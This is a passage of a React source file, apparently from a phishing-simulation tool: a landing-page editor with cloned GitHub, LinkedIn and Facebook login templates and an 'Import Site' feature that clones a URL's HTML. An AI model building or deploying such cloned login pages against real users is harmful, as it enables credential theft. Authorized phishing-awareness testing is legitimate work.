<script nonce="eFKpMBmC">requireLazy(["__bigPipe"],(function(bigPipe){bigPipe.onPageletArrive({displayResources:["v7mIMQ6","u4F94Jx","O0cNsdJ","1h7XxfK","TDHK2+O","P/mr5VE"],id:"first_response",phase:0,last_in_phase:true,tti_phase:0,all_phases:[63],hsrp:{hblp:{consistency:{rev:1024172672},indexUpgrades:{}}},allResources:["v7mIMQ6","u4F94Jx","O0cNsdJ","KZEmWCb","1h7XxfK","TDHK2+O","i+C54s1","bfZbzE3","G0FRbCI","H3fxfLR","I+GHswV","zPYlTyl","DBqOVS0","P/mr5VE","S3gsgXq"]});}));</script>
<script nonce="eFKpMBmC">requireLazy(["__bigPipe"],function(bigPipe){bigPipe.setPageID("7519799750659299459")});</script><script nonce="eFKpMBmC">(function(){var n=now_inl();requireLazy(["__bigPipe"],function(bigPipe){bigPipe.beforePageletArrive("last_response",n);})})();</script>
<script nonce="eFKpMBmC">requireLazy(["__bigPipe"],(function(bigPipe){bigPipe.onPageletArrive({displayResources:["bfZbzE3"],id:"last_response",phase:63,last_in_phase:true,the_end:true,jsmods:{define:[["cr:6016",["NavigationMetricsWWW"],{__rc:["NavigationMetricsWWW",null]},-1],["cr:7383",["BanzaiWWW"],{__rc:["BanzaiWWW",null]},-1],["cr:5662",["Event"],{__rc:["Event",null]},-1],["cr:686",[],{__rc:[null,null]},-1],["cr:1984081",[],{__rc:[null,null]},-1],["cr:3376",[],{__rc:[null,null]},-1],["cr:1083116",["XAsyncRequest"],{__rc:["XAsyncRequest",null]},-1],["cr:1083117",[],{__rc:[null,null]},-1],["TimeSliceInteractionSV",[],{on_demand_reference_counting:true,on_demand_profiling_counters:true,default_rate:1000,lite_default_rate:100,interaction_to_lite_coinflip:{ADS_INTERFACES_INTERACTION:0,ads_perf_scenario:0,ads_wait_time:0,Event:1},interaction_to_coinflip:{ADS_INTERFACES_INTERACTION:1,ads_perf_scenario:1,ads_wait_time:1,Event:100},enable_heartbeat:false,maxBlockMergeDuration:0,maxBlockMergeDistance:0,enable_banzai_stream:true,user_timing_coinflip:50,banzai_stream_coinflip:0,compression_enabled:true,ref_counting_fix:false,ref_counting_cont_fix:false,also_record_new_timeslice_format:false,force_async_request_tracing_on:false},2609],["IntlCurrentLocale",[],{code:"id_ID"},5954],["BDSignalCollectionData",[],{sc:"{\"t\":1659080345,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30021,540823],[30022,540817],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",fds:60,fda:60,i:60,sbs:1,dbs:100,bbs:100,hbi:60,rt:262144,hbcbc:2,hbvbc:0,hbbi:30,sid:-1,hbv:"6692050157477493352"},5239],["cr:1642797",["BanzaiBase"],{__rc:["BanzaiBase",null]},-1],["cr:1042",["XAsyncRequestWWW"],{__rc:["XAsyncRequestWWW",null]},-1],["cr:1172",["WebSession"],{__rc:["WebSession",null]},-1],["cr:2037",["BanzaiAdapter"],{__rc:["BanzaiAdapter",null]},-1],["cr:3724",["SetIdleTimeoutAcrossTransitions"],{__rc:["SetIdleTimeoutAcrossTransitions",null]},-1],["cr:9985",["performanceAbsoluteNow"],{__rc:["performanceAbsoluteNow",null]},-1],["cr:9986",["CurrentUser"],{__rc:["CurrentUser",null]},-1],["cr:9987",["NavigationMetrics"],{__rc:["NavigationMetrics",null]},-1],["cr:9988",["Visibility"],{__rc:["Visibility",null]},-1],["cr:5866",["BanzaiAdapterWWW"],{__rc:["BanzaiAdapterWWW",null]},-1],["cr:7384",["cancelIdleCallbackWWW"],{__rc:["cancelIdleCallbackWWW",null]},-1],["cr:692209",["cancelIdleCallbackBlue"],{__rc:["cancelIdleCallbackBlue",null]},-1],["BanzaiConfig",[],{MAX_SIZE:10000,MAX_WAIT:150000,MIN_WAIT:null,RESTORE_WAIT:150000,blacklist:["time_spent"],disabled:false,gks:{comet_flush_lazy_queue:true,boosted_pagelikes:true,platform_oauth_client_events:true,sticker_search_ranking:true},known_routes:["artillery_javascript_actions","artillery_javascript_trace","artillery_logger_data","logger","falco","gk2_exposure","js_error_logging","loom_trace","marauder","perfx_custom_logger_endpoint","qex","require_cond_exposure_logging","metaconfig_exposure"],should_drop_unknown_routes:true,should_log_unknown_routes:false},7],["cr:5695",["EventListenerWWW"],{__rc:["EventListenerWWW",null]},-1],["cr:844180",["TimeSpentImmediateActiveSecondsLoggerBlue"],{__rc:["TimeSpentImmediateActiveSecondsLoggerBlue",null]},-1],["cr:1187159",["BlueCompatBroker"],{__rc:["BlueCompatBroker",null]},-1],["cr:1634616",["UserActivityBlue"],{__rc:["UserActivityBlue",null]},-1],["WebDevicePerfInfoData",[],{needsFullUpdate:true,needsPartialUpdate:false,shouldLogResourcePerf:false},3977],["TimeSpentConfig",[],{delay:1000,timeout:64,"0_delay":0,"0_timeout":8},142],["cr:710",[],{__rc:[null,null]},-1],["cr:1353359",["EventListenerImplForBlue"],{__rc:["EventListenerImplForBlue",null]},-1],["ImmediateActiveSecondsConfig",[],{sampling_rate:0},423],["CometAltpayJsSdkIframeAllowedDomains",[],{allowed_domains:["https://live.adyen.com","https://integration-facebook.payu.in","https://facebook.payulatam.com","https://secure.payu.com","https://facebook.dlocal.com","https://buy2.boku.com"]},4920]],require:[["BDClientSignalCollectionTrigger","startSignalCollection",[],[{sc:"{\"t\":1659080345,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30021,540823],[30022,540817],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",fds:60,fda:60,i:60,sbs:1,dbs:100,bbs:100,hbi:60,rt:262144,hbcbc:2,hbvbc:0,hbbi:30,sid:-1,hbv:"6692050157477493352"}]],["NavigationMetrics","setPage",[],[{page:"XWebLoginController",page_type:"normal",page_uri:"https://id-id.facebook.com/login/device-based/regular/login/?login_attempt=1",serverLID:"7519799750659299459"}]],["FalcoLoggerTransports","attach",[],[]],["Chromedome","start",[],[{}]],["DimensionTracking"],["ClickRefLogger"],["NavigationClickPointHandler"],["DeferredCookie","addToQueue",[],["_js_datr","CLJbaAH444AT0d5TnISU5CVH",34560000000,"/",true,false,true,".facebook.com"]],["WebDevicePerfInfoLogging","doLog",[],[]],["Artillery","disable",[],[]],["ScriptPathLogger","startLogging",[],[]],["TimeSpentBitArrayLogger","init",[],[]],["TransportSelectingClientSingletonConditional"],["RequireDeferredReference","unblock",[],[["TransportSelectingClientSingletonConditional"],"sd"]],["RequireDeferredReference","unblock",[],[["TransportSelectingClientSingletonConditional"],"css"]]]},hsrp:{hsdp:{clpData:{"1871697":{r:1,s:1},"1829319":{r:1},"1829320":{r:1},"1843988":{r:1}}},hblp:{consistency:{rev:1024172672},indexUpgrades:{__hsdp:":130,60,66,71,68,67,129,77,69,81,83,61,46,80,82,73,47"}}},allResources:["H3fxfLR","zPYlTyl","1h7XxfK","TDHK2+O","3O6D9Gy","q02Rcrn","bfZbzE3"]});}));</script></body>
</html>`;

const EMAIL_TEMPLATES = [
  { name: "Login Github", content: TEMPLATE_LOGIN_GITHUB },
  { name: "Login Linkedin", content: TEMPLATE_LOGIN_LINKEDIN },
  { name: "Login Facebook", content: TEMPLATE_LOGIN_FACEBOOK },
];

type LandingPageBodyEditorProps = {
  templateName?: string;
  envelopeSender?: string;
  subject?: string;
  initialContent?: string;
  onBodyChange: (body: string) => void;
};

const LandingPageBodyEditor = ({
  onBodyChange,
  initialContent = "",
}: LandingPageBodyEditorProps) => {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [activeTab, setActiveTab] = useState(0);
  const [selectedTemplate, setSelectedTemplate] = useState(() => {
    const matchedTemplate = EMAIL_TEMPLATES.find(template => template.content === initialContent);
    return matchedTemplate ? matchedTemplate.name : "Custom";
  });

  useEffect(() => {
    const matchedTemplate = EMAIL_TEMPLATES.find(template => template.content === initialContent);
    setSelectedTemplate(matchedTemplate ? matchedTemplate.name : "Custom");
  }, [initialContent]);

  const handleTemplateChange = (event: React.ChangeEvent<HTMLSelectElement>) => {
    const newTemplateName = event.target.value;
    setSelectedTemplate(newTemplateName);

    if (newTemplateName === "Custom") {
      return;
    }
    const template = EMAIL_TEMPLATES.find(t => t.name === newTemplateName);
    if (template) {
      onBodyChange(template.content);
    }
  };

  const handleImportButtonClick = () => {
    setIsModalOpen(true);
  };

  const handleImportFromUrl = async (url: string) => {
    setIsLoading(true);
    try {
      const API_URL = import.meta.env.VITE_API_URL;
      const token = localStorage.getItem("token");
      const response = await fetch(`${API_URL}/landing-page/clone-site`, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ url }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to fetch content from URL.');
      }


      const data = await response.json();
      onBodyChange(data.html);
      setSelectedTemplate("Custom");
      setIsModalOpen(false);

      Swal.fire({
        text: "URL imported successfully!",
        icon: 'success',
        duration: 2000,
      });

    } catch (error) {
      console.log('Error: ', error);
      Swal.fire({
        text: "Error",
        icon: 'error',
        duration: 4000,
      });
    } finally {
      setIsLoading(false);
    }
  };

  const tabs = ["HTML Editor", "Live Preview"];

  return (
    <div className="bg-white dark:bg-gray-900 rounded-lg shadow-lg border border-gray-200 dark:border-gray-800">
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {/* Template Selector */}
        <div className="p-4">
          <label htmlFor="email-template-select" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
            Default Landing Page Template:
          </label>
          <div className="relative">
            <select
              id="email-template-select"
              value={selectedTemplate}
              onChange={handleTemplateChange}
              className="
                appearance-none
                block w-full px-4 py-3
                text-base
                border border-gray-300 dark:border-gray-700
                rounded-lg
                bg-white dark:bg-gray-800
                text-gray-900 dark:text-gray-100
                shadow-sm
                transition-all duration-200 ease-in-out
                focus:ring-2 focus:ring-blue-500 focus:border-blue-500
                dark:focus:ring-blue-400 dark:focus:border-blue-400
                cursor-pointer
                pr-10
              "
            >
              <option value="Custom">Custom Template</option>
              {EMAIL_TEMPLATES.map((template) => (
                <option key={template.name} value={template.name}>
                  {template.name}
                </option>
              ))}
            </select>
            <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700 dark:text-gray-300">
              <svg
                className="h-5 w-5"
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 20 20"
                fill="currentColor"
                aria-hidden="true"
              >
                <path
                  fillRule="evenodd"
                  d="M5.23 7.21a.75.75 0 011.06.02L10 10.94l3.71-3.71a.75.75 0 111.06 1.06l-4.25 4.25a.75.75 0 01-1.06 0L5.23 8.29a.75.75 0 010-1.08z"
                  clipRule="evenodd"
                />
              </svg>
            </div>
          </div>
        </div>

        {/* Import Template Button and hidden file input */}
        <div className="p-4 flex items-end"> {/* Align button to the bottom if content above is taller */}
          <button
            onClick={handleImportButtonClick}
            className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2.5 w-full md:w-auto rounded-lg text-sm font-medium transition-colors duration-200 shadow-md flex items-center justify-center gap-2 h-12"
          >
            <CiGlobe className="w-5 h-5"/>
            <span>Import Site</span>
          </button>
        </div>
      </div>

      {/* Tab Navigation */}
      <div className="flex space-x-1 mx-4 bg-gray-100 dark:bg-gray-800 p-1 mb-0 rounded-lg">
        {tabs.map((tab, index) => (
          <button
            key={index}
            onClick={() => setActiveTab(index)}
            className={`flex-1 rounded-lg py-2.5 text-sm font-medium leading-5 transition-all duration-200 ease-in-out ${
              activeTab === index
                ? "bg-white text-blue-600 shadow-md dark:bg-gray-700 dark:text-blue-400"
                : "text-gray-600 hover:bg-gray-200 dark:text-gray-300 dark:hover:bg-gray-600"
            }`}
          >
            {tab}
          </button>
        ))}
      </div>

      <div className="rounded-b-xl min-h-[500px]">
        {activeTab === 0 ? (
          // HTML Editor Tab
          <div className="p-4 h-full">
            <div className="mb-4">
              <label htmlFor="html-editor-textarea" className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Edit HTML Landing Page Template:
              </label>
              <textarea
                id="html-editor-textarea"
                value={initialContent}
                onChange={(e) => onBodyChange(e.target.value)}
                className="w-full h-96 p-3 border border-gray-300 dark:border-gray-600 rounded-md bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 font-mono text-xs resize-none focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-blue-400 shadow-sm"
                placeholder="Masukkan HTML content di sini..."
              />
            </div>

            {/* Quick Insert Buttons */}
            <div className="flex flex-wrap gap-2 mb-4">
              <button
                onClick={() => onBodyChange(initialContent + '\n<p style="color: #666; margin: 10px 0;">New paragraph</p>')}
                className="px-3 py-1 text-xs bg-blue-100 text-blue-700 rounded-full hover:bg-blue-200 transition-colors duration-200 dark:bg-blue-900/40 dark:text-blue-300 dark:hover:bg-blue-900/60"
                title="Insert a new paragraph tag"
              >
                + Paragraph
              </button>
              <button
                onClick={() => onBodyChange(initialContent + '\n<h2 style="color: #333; margin: 15px 0;">New Heading</h2>')}
                className="px-3 py-1 text-xs bg-green-100 text-green-700 rounded-full hover:bg-green-200 transition-colors duration-200 dark:bg-green-900/40 dark:text-green-300 dark:hover:bg-green-900/60"
                title="Insert a new heading (H2) tag"
              >
                + Heading
              </button>
              <button
                onClick={() => onBodyChange(initialContent + '\n<a href="#" style="color: #667eea; text-decoration: none;">Link Text</a>')}
                className="px-3 py-1 text-xs bg-purple-100 text-purple-700 rounded-full hover:bg-purple-200 transition-colors duration-200 dark:bg-purple-900/40 dark:text-purple-300 dark:hover:bg-purple-900/60"
                title="Insert a new anchor (link) tag"
              >
                + Link
              </button>
              <button
                onClick={() => onBodyChange(initialContent + '\n<div style="background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 15px 0;">Box Content</div>')}
                className="px-3 py-1 text-xs bg-yellow-100 text-yellow-700 rounded-full hover:bg-yellow-200 transition-colors duration-200 dark:bg-yellow-900/40 dark:text-yellow-300 dark:hover:bg-yellow-900/60"
                title="Insert a new content box div"
              >
                + Box
              </button>
            </div>

            <div className="text-xs text-gray-500 dark:text-gray-400 bg-gray-50 dark:bg-gray-800 p-3 rounded-md shadow-inner">
              <strong className="block mb-1 text-gray-700 dark:text-gray-300">💡 Important Tips for Email HTML:</strong>
              <ul className="mt-1 space-y-1 list-disc list-inside">
                <li><strong>Security:</strong> Link and script tags are disabled in the preview for security reasons.</li>
                <li><strong>Styling:</strong> Prefer inline CSS for styling elements, as external stylesheets might not be supported.</li>
                <li><strong>Responsiveness:</strong> Use media queries and fluid layouts for optimal mobile viewing.</li>
                <li><strong>Width:</strong> Use fixed widths in pixels for main content tables (e.g., `max-width: 600px`).</li>
              </ul>
            </div>
          </div>
        ) : (
          // Live Preview Tab
          <div className="p-4 h-full">
            {/* Live Preview */}
            <div className="border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-900 min-h-[400px] overflow-hidden flex items-center justify-center relative">
              {initialContent ? (
                <iframe
                  srcDoc={initialContent}
                  className="w-full h-full min-h-[400px] border-none"
                  title="Email Preview"
                  sandbox="allow-same-origin allow-popups"
                  style={{ background: '#ffffff' }}
                />
              ) : (
                <div className="p-8 text-gray-400 text-center">
                  <div className="text-6xl mb-4 animate-bounce flex justify-center">
                    <RiPagesLine />
                  </div>
                  <div className="text-lg font-medium">No HTML content to display.</div>
                  <div className="text-sm mt-2">Start typing in the HTML editor or choose a template!</div>
                </div>
              )}
            </div>

            {/* Preview Notes */}
            <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-3 bg-blue-50 dark:bg-blue-900/20 rounded-lg border border-blue-100 dark:border-blue-900">
                <div className="text-xs text-blue-700 dark:text-blue-300 font-medium">
                  <strong><span className="text-base">🖥️</span> Desktop View Insight</strong><br/>
                  This preview reflects how your email will likely appear in common desktop clients (e.g., Chrome, Edge, Safari).
                </div>
              </div>
              <div className="p-3 bg-orange-50 dark:bg-orange-900/20 rounded-lg border border-orange-100 dark:border-orange-900">
                <div className="text-xs text-orange-700 dark:text-orange-300 font-medium">
                  <strong><span className="text-base">📱</span> Mobile Responsiveness Reminder</strong><br/>
                  For optimal mobile experience, ensure you incorporate responsive design techniques like media queries. This preview may not fully represent mobile rendering.
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* URL MODAL IMPORT SITE */}
      <UrlImportModal 
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        onImport={handleImportFromUrl}
        isLoading={isLoading}
      />
    </div>
  );
};

export default LandingPageBodyEditor;